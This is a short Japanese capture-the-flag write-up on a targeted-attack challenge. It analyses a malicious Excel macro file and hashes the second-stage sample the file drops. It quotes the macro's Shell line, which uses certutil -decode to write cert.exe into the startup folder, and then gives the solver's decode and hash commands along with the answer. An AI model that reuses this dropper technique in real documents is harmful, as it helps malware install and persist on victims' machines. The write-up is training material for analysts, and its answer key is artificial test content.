# 標的攻撃III★★☆

```
「製品価格一覧20180711.xls」の動作を終えると、別のファイルが生成され、そこから2次検体が生成されます。2次検体のSHA256ハッシュ値を調べてください。
```

URLからファイルを取得し、VBAスクリプトに含まれている

```
Shell "certutil -decode """ & startupFolder & "\cert.pem"" """ & startupFolder & "\cert.exe"""
```

コマンドを実行すればいいことがわかる。

```powershell
PS>certutil -decode cert.pem cert.exe
```

あとはhashを取得するだけでよい

```powershell
PS>certutil -hashfile cert.exe sha256
SHA256 ハッシュ (対象 cert.exe):
c4f069d079330cd46e51f9469c27015ed34c6371481df83a323bc098f3b53382
CertUtil: -hashfile コマンドは正常に完了しました。
```